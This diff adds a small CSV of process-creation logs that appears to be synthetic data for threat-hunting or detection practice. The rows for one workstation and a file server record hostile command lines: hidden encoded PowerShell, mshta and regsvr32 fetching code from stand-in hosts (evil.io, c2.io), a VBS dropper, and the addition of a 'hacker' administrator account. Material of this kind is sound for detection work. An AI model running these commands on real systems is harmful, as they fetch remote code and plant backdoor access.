@@ -1,0 +1,12 @@
+timestamp,device,parent_process,child_process,cmdline,account
+2025-07-01 14:00,PC-CHARLIE-01,explorer.exe,powershell.exe,powershell.exe -nop -w hidden -enc JABjAG,charlie
+2025-07-01 14:00,PC-CHARLIE-01,powershell.exe,cmd.exe,cmd.exe /c whoami,charlie
+2025-07-01 14:01,PC-CHARLIE-01,powershell.exe,mshta.exe,mshta.exe http://evil.io/payload.hta,charlie
+2025-07-01 14:01,PC-CHARLIE-01,mshta.exe,wscript.exe,wscript.exe //b dropper.vbs,charlie
+2025-07-01 14:02,PC-CHARLIE-01,wscript.exe,cmd.exe,cmd.exe /c net user hacker P@ss /add,charlie
+2025-07-01 14:03,PC-CHARLIE-01,cmd.exe,net.exe,net.exe localgroup administrators hacker /add,charlie
+2025-07-01 14:30,SRV-FILE-01,explorer.exe,powershell.exe,powershell.exe -ep bypass -f scan.ps1,SYSTEM
+2025-07-01 14:31,SRV-FILE-01,powershell.exe,rundll32.exe,rundll32.exe shell32.dll,SYSTEM
+2025-07-01 14:32,SRV-FILE-01,rundll32.exe,regsvr32.exe,regsvr32.exe /s /n /u /i:http://c2.io,SYSTEM
+2025-07-01 15:00,PC-BOB-01,explorer.exe,cmd.exe,cmd.exe /k,bob
+2025-07-01 15:01,PC-BOB-01,cmd.exe,powershell.exe,powershell.exe Get-Process,bob
